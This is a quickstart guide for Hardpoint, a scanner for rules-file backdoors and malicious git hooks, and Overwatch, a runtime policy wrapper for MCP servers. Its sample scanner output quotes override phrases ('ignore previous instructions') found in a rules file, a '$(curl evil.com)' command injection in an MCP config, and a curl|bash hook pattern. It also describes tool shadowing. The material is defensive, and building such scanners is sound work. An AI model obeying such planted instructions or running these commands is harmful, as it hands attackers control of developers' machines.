# Quickstart

Get security protection for your AI-assisted development environment in under a minute.

---

## Hardpoint

Hardpoint scans your developer environment for Rules File Backdoor attacks and other AI-era security threats.

### 1. Install

```bash
go install github.com/dotsetlabs/hardpoint/cmd/hardpoint@latest
```

### 2. Run a Scan

```bash
hardpoint scan
```

### 3. Example Output

```
Hardpoint Security Scanner
==========================

Scanning: /Users/dev/project
Scanners: ai, git

Findings
--------

  CRITICAL  AI-008: Semantic Hijacking Detected
            File: .cursorrules:15
            Malicious instructions hidden in comment section
            Patterns: "ignore previous instructions", "new instructions:"

  CRITICAL  AI-005: Command Injection in MCP Config
            File: mcp.json:8
            Shell command substitution detected: $(curl evil.com)

  HIGH      GIT-001: Malicious Git Hook Pattern
            File: .git/hooks/pre-commit:12
            Suspicious curl|bash pattern detected

Summary: 2 critical, 1 high (3 total)
```

### 4. Scanners

| Scanner | Description |
|:--------|:------------|
| `ai` | AI config files (`.cursorrules`, `CLAUDE.md`, `mcp.json`, `.github/copilot-instructions.md`) |
| `git` | Git hooks and configuration |

```bash
# Run specific scanners
hardpoint scan --scanners ai
```

### 5. Detection Rules

| Rule | Severity | Description |
|:-----|:---------|:------------|
| AI-004 | Medium | Encoded Instructions (Base64 hidden content) |
| AI-005 | Critical | Command Injection in MCP Config |
| AI-008 | Critical | Semantic Hijacking (Rules File Backdoor) |
| GIT-001 | Critical | Malicious Git Hook Pattern |
| GIT-002 | Critical | Credential Exfiltration in Hook |
| GIT-003 | Medium | Network Access in Git Hook |
| GIT-004 | High | Obfuscated Git Hook Content |
| GIT-005 | Medium | Suspicious Git Remote URL |
| GIT-006 | High | Suspicious Credential Helper |

### 6. Trust System

Create a baseline of trusted AI config files:

```bash
# Trust current state of AI configs
hardpoint trust --all

# Verify no tampering has occurred
hardpoint verify
```

## Overwatch

Overwatch adds runtime security to MCP servers with tool shadowing detection and policy enforcement.

### 1. Install

```bash
npm install -g @dotsetlabs/overwatch
```

### 2. Wrap Any MCP Server

Instantly protect any MCP server without configuration:

```bash
overwatch wrap npx @modelcontextprotocol/server-postgres
```

This intercepts all tool calls and prompts you for approval.

### 3. Tool Shadowing Detection

Overwatch detects when malicious MCP servers try to shadow trusted tools:

```
[SECURITY] Tool shadowing collision detected!
  Tool: read_file
  Server A: filesystem (trusted)
  Server B: malicious-helper (untrusted)
  Risk: CRITICAL - Schema mismatch detected
```

### 4. Policy Engine

Overwatch classifies operations and applies policies:

| Action | Description |
|:-------|:------------|
| `allow` | Immediately allow the operation |
| `prompt` | Request user approval |
| `deny` | Block the operation |

### 5. Use with Claude Desktop

Update your Claude Desktop config (`~/Library/Application Support/Claude/claude_desktop_config.json`):

```json
{
  "mcpServers": {
    "postgres": {
      "command": "npx",
      "args": [
        "-y", "@dotsetlabs/overwatch", "wrap",
        "npx", "-y", "@modelcontextprotocol/server-postgres"
      ],
      "env": {
        "DATABASE_URL": "postgres://localhost/mydb"
      }
    }
  }
}
```

### 6. Create a Policy File

For fine-grained control, create `overwatch.yaml`:

```bash
overwatch init
```

```yaml
version: 1
defaults:
  action: prompt
  timeout: 60000
  sessionDuration: 300000

servers:
  postgres:
    command: npx
    args: ["-y", "@modelcontextprotocol/server-postgres"]
    policies:
      - tools: ["query", "select"]
        action: allow
      - tools: ["insert", "update"]
        action: prompt
      - tools: ["drop_*", "delete_*"]
        action: deny

toolShadowing:
  enabled: true
  checkDescriptions: true
  detectMutations: true
```

```bash
# Start with config
overwatch start
```

### 7. Session Approvals

Grant time-limited approvals for repeated operations:

```bash
# View active sessions
overwatch sessions list

# Revoke a session
overwatch sessions revoke <session-id>

# Revoke all sessions
overwatch sessions revoke --all
```

## Defense in Depth

Use both tools together for complete protection:

```
   STATIC SCAN              RUNTIME PROTECTION
        |                          |
        v                          v
  +----------+              +-----------+
  | Hardpoint|      ->      | Overwatch |
  |   scan   |              |   wrap    |
  +----------+              +-----------+
        |                          |
        v                          v
    Detect                    Enforce
   AI config                  policies
    threats                  at runtime
```

```bash
# Complete security workflow
hardpoint scan                      # Scan for threats
hardpoint trust --all               # Baseline trusted configs
overwatch wrap npx server           # Protect MCP server
```
